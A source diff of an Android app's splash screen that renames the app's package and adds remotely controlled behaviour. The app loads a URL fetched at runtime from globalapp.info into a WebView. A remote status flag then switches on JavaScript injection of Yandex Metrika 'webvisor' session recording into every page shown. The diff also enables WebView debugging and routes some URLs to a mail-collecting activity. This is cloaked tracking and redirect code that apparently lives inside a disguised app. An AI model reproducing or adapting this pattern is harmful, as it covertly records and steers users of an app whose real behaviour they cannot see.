@@ -1,4 +1,4 @@
-package com.thisismyway.useit.getme.activities;
+package com.checkoutme.youfine.bestplace.activities;
 
 import android.Manifest;
 import android.app.Activity;
@@ -24,6 +24,8 @@ import android.view.animation.AnimationUtils;
 import android.webkit.CookieManager;
 import android.webkit.ValueCallback;
 import android.webkit.WebChromeClient;
+import android.webkit.WebResourceError;
+import android.webkit.WebResourceRequest;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
@@ -34,7 +36,8 @@ import android.widget.Toast;
 import com.android.installreferrer.api.InstallReferrerClient;
 import com.android.installreferrer.api.InstallReferrerStateListener;
 import com.android.installreferrer.api.ReferrerDetails;
-import com.thisismyway.useit.getme.R;
+import com.checkoutme.youfine.bestplace.R;
+import com.checkoutme.youfine.bestplace.activities.ActivityGetMail;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -47,7 +50,9 @@ import java.net.URLConnection;
 import java.text.DateFormat;
 import java.text.ParseException;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -56,7 +61,7 @@ public class ActivityScreenSplash extends Activity {
     //    private InterstitialAd mInterstitialAd;
     public static String TAG = "Cash";
 
-    private String site;
+    private String site, status;
 
     private WebView mWebView;
 
@@ -64,6 +69,26 @@ public class ActivityScreenSplash extends Activity {
     Timer interstitialAsLoad;
 
     Date date = null;
+
+    public ValueCallback<Uri[]> uploadMessage;
+    public static final int REQUEST_SELECT_FILE = 100;
+
+    private final static String s = "var script = document.createElement('script'); script.innerHTML = function test(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)};" +
+            "document.body.appendChild(script);";
+
+    private final static String b = "var loader = document.createElement('script');" +
+            "loader.innerHTML = test(window, document, \"script\", \"https://mc.yandex.ru/metrika/tag.js\", \"ym\");" +
+            "document.body.appendChild(loader);";
+
+    private final static String c = "var exe = document.createElement('script');" +
+            "exe.innerHTML = ym(56140669, \"init\", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true });" +
+            "document.body.appendChild(exe);";
+
+    private void injectJS() {
+        mWebView.loadUrl("javascript:" + s);
+        mWebView.loadUrl("javascript:" + b);
+        mWebView.loadUrl("javascript:" + c);
+    }
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -120,16 +145,20 @@ public class ActivityScreenSplash extends Activity {
         }
 
         mWebView= (WebView) findViewById(R.id.web);
+        String MyUA = "use required/intended UA string";
+        mWebView.getSettings().setUserAgentString(MyUA);
         mWebView.getSettings().setJavaScriptEnabled(true);
+        mWebView.getSettings().setDomStorageEnabled(true);
         mWebView.getSettings().setPluginState(WebSettings.PluginState.OFF);
         mWebView.getSettings().setLoadWithOverviewMode(true);
-        mWebView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
+        mWebView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
         mWebView.getSettings().setUseWideViewPort(true);
-        mWebView.getSettings().setUserAgentString("Android Mozilla/5.0 AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30");
         mWebView.getSettings().setAllowFileAccess(true);
         mWebView.getSettings().setAllowFileAccess(true);
         mWebView.getSettings().setAllowContentAccess(true);
         mWebView.getSettings().supportZoom();
+        mWebView.setWebChromeClient(new ChromeClient());
+        mWebView.setWebContentsDebuggingEnabled(true);
 
         mWebView.setWebViewClient(new WebViewClient() {
             public boolean shouldOverrideUrlLoading(WebView view, String url) {
@@ -156,84 +185,116 @@ public class ActivityScreenSplash extends Activity {
                 return false; // then it is not handled by default action
             }
 
-
             @Override
-            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
-
-                Log.e("error",description);
+            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error){
+                //Your code to do
+                Toast.makeText(ActivityScreenSplash.this, error.toString(), Toast.LENGTH_LONG).show();
             }
-
-
-            @Override
-            public void onPageStarted(WebView view, String url, Bitmap favicon) {        //show progressbar here
-
-                super.onPageStarted(view, url, favicon);
-            }
-
-            @Override
-            public void onPageFinished(WebView view, String url) {
-                //hide progressbar here
-
-            }
-
         });
 
-        mWebView.setWebChromeClient(new ChromeClient());
+        StartAnimations();
 
-        if (ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
-                || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
-                || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-
-            requestAndExternalPermission();
-        }
-
-            StartAnimations();
-
-            new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    URLConnection conn = null;
-                    try {
-                        conn = new URL("http://globalapp.info/38.txt").openConnection();
-                        InputStream in = conn.getInputStream();
-                        site = convertStreamToString(in);
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                URLConnection conn = null;
+                try {
+                    conn = new URL("http://globalapp.info/101.txt").openConnection();
+                    InputStream in = conn.getInputStream();
+                    site = convertStreamToString(in);
+                } catch (IOException e) {
+                    e.printStackTrace();
                 }
-            }).start();
+            }
+        }).start();
 
-            new Handler().postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    if (site != null && site != "") {
-                        mWebView.loadUrl(site.substring(0, site.length() - 1));
-
-//                    Toast.makeText(ActivityScreenSplash.this, "redirected from: " + site, Toast.LENGTH_LONG).show();
-                    }
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                URLConnection conn = null;
+                try {
+                    conn = new URL("http://globalapp.info/web101.txt").openConnection();
+                    InputStream in = conn.getInputStream();
+                    status = convertStreamToString(in);
+                } catch (IOException e) {
+                    e.printStackTrace();
                 }
-            }, 1000);
+            }
+        }).start();
 
-            new Handler().postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    try {
-                        if (mWebView.getUrl().contains("http://appgplaybestpro.info")) {
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (site != null && site != "") {
+                    mWebView.loadUrl(site.substring(0, site.length() - 1));
 
-                            Intent intent = new Intent(getApplicationContext(), ActivityGetMail.class);
-                            startActivity(intent);
-                            finish();
-                        } else {
-                            interstitialAsLoad.cancel();
-                            mWebView.setVisibility(View.VISIBLE);
-                            ImageView iv = (ImageView) findViewById(R.id.splash);
-                            iv.setVisibility(View.GONE);
-                        }
-                    } catch (Exception e) {
+                    if (status.contains("1"))
+                        mWebView.setWebViewClient(new WebViewClient() {
+                            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                                // do your handling codes here, which url is the requested url
+                                // probably you need to open that url rather than redirect:
+                                if ( url.contains(".pdf")){
+                                    Intent intent = new Intent(Intent.ACTION_VIEW);
+                                    intent.setDataAndType(Uri.parse(url), "application/pdf");
+                                    try{
+                                        view.getContext().startActivity(intent);
+                                    } catch (ActivityNotFoundException e) {
+                                        //user does not have a pdf viewer installed
+                                    }
+                                } else {
+                                    if (url.contains("http://appgplaybestpro.info")) {
+                                        Intent intent = new Intent(getApplicationContext(), ActivityGetMail.class);
+                                        startActivity(intent);
+                                        finish();
+                                        return false;
+                                    }
 
-                    }
+                                    mWebView.loadUrl(url);
+                                    return true;                }
+                                return false; // then it is not handled by default action
+                            }
+
+                            @Override
+                            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error){
+                                //Your code to do
+                                Toast.makeText(ActivityScreenSplash.this, error.toString(), Toast.LENGTH_LONG).show();
+                            }
+
+                            @Override
+                            public void onPageFinished(WebView view, String url) {
+                                super.onPageFinished(view, url);
+                                try {
+                                    injectJS();
+                                } catch (Exception e) {
+                                }
+                            }
+                        });
+
+//                Toast.makeText(ActivityScreenSplash.this, "redirected from: " + site, Toast.LENGTH_LONG).show();
                 }
-            }, 2500);
+            }
+        }, 1000);
+
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (mWebView.getUrl().contains("http://appgplaybestpro.info")) {
+
+                        Intent intent = new Intent(getApplicationContext(), ActivityGetMail.class);
+                        startActivity(intent);
+                        finish();
+                    } else {
+                        interstitialAsLoad.cancel();
+                        mWebView.setVisibility(View.VISIBLE);
+                        ImageView iv = (ImageView) findViewById(R.id.splash);
+                        iv.setVisibility(View.GONE);
+                    }
+                } catch (Exception e) {
+
+                }
+            }
+        }, 2500);
 
 //        } else {
 //            requestAndExternalPermission();
@@ -291,6 +352,15 @@ public class ActivityScreenSplash extends Activity {
 
     @Override
     public void onActivityResult(int requestCode, int resultCode, Intent data) {
+
+        if (requestCode == REQUEST_SELECT_FILE) {
+            if (uploadMessage == null) return;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, data));
+            }
+            uploadMessage = null;
+        }
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
 
             if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
@@ -389,7 +459,7 @@ public class ActivityScreenSplash extends Activity {
             public void run() {
                 runOnUiThread(new Runnable() {
                     public void run() {
-                if (timer[0] >= 8) {
+                        if (timer[0] >= 8) {
                             startMenuActivity();
 
                             if (!adIsLoaded && !startAdStarted) {
@@ -460,55 +530,101 @@ public class ActivityScreenSplash extends Activity {
 
         // For Android 5.0
         public boolean onShowFileChooser(WebView view, ValueCallback<Uri[]> filePath, WebChromeClient.FileChooserParams fileChooserParams) {
-            // Double check that we don't have any existing callbacks
-            if (mFilePathCallback != null) {
-                mFilePathCallback.onReceiveValue(null);
-            }
-            mFilePathCallback = filePath;
+            if (ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+                    || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+                    || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
 
-            Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
-            if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
-                // Create the File where the photo should go
-                File photoFile = null;
-                try {
-                    photoFile = createImageFile();
-                    takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath);
-                } catch (IOException ex) {
-                    // Error occurred while creating the File
-//                Log.e(Common.TAG, "Unable to create Image File", ex);
-                }
+                requestAndExternalPermission();
 
-                // Continue only if the File was successfully created
-                if (photoFile != null) {
-                    mCameraPhotoPath = "file:" + photoFile.getAbsolutePath();
-                    takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT,
-                            Uri.fromFile(photoFile));
-                } else {
-                    takePictureIntent = null;
-                }
-            }
-
-            Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
-            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
-            contentSelectionIntent.setType("image/*");
-
-            Intent[] intentArray;
-            if (takePictureIntent != null) {
-                intentArray = new Intent[]{takePictureIntent};
+                return false;
             } else {
-                intentArray = new Intent[0];
+                if (mFilePathCallback != null) {
+                    mFilePathCallback.onReceiveValue(null);
+                }
+                mFilePathCallback = filePath;
+
+                Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+                if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
+                    // Create the File where the photo should go
+                    File photoFile = null;
+                    try {
+                        photoFile = createImageFile();
+                        takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath);
+                    } catch (IOException ex) {
+                        // Error occurred while creating the File
+                        //                Log.e(Common.TAG, "Unable to create Image File", ex);
+                    }
+
+                    // Continue only if the File was successfully created
+                    if (photoFile != null) {
+                        mCameraPhotoPath = "file:" + photoFile.getAbsolutePath();
+                        takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT,
+                                Uri.fromFile(photoFile));
+                    } else {
+                        takePictureIntent = null;
+                    }
+                }
+
+                Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
+                contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
+                contentSelectionIntent.setType("image/*");
+
+                Intent[] intentArray;
+                if (takePictureIntent != null) {
+                    intentArray = new Intent[]{takePictureIntent};
+                } else {
+                    intentArray = new Intent[0];
+                }
+
+                Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
+                chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
+                chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser");
+                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
+
+                startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE);
+
+                return true;
             }
-
-            Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
-            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
-            chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser");
-            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
-
-            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE);
-
-            return true;
-
         }
+
+//        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, final WebChromeClient.FileChooserParams fileChooserParams) {
+//            // make sure there is no existing message
+//            if (uploadMessage != null) {
+//                uploadMessage.onReceiveValue(null);
+//                uploadMessage = null;
+//            }
+//
+//            uploadMessage = filePathCallback;
+//
+//            try {
+//                ActivityScreenSplash.this.runOnUiThread(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                        Intent intent = null;
+//                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
+//                            intent = fileChooserParams.createIntent();
+//                        }
+//
+//                        startActivityForResult(intent, ActivityScreenSplash.REQUEST_SELECT_FILE);
+//                    }
+//                });
+//            } catch (ActivityNotFoundException e) {
+//                uploadMessage = null;
+//
+//                if (ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+//                        || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+//                        || ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+//
+//                    requestAndExternalPermission();
+//
+//                    return false;
+//                }
+//
+//                return false;
+//            }
+//
+//            return true;
+//        }
 
         // openFileChooser for Android 3.0+
         public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
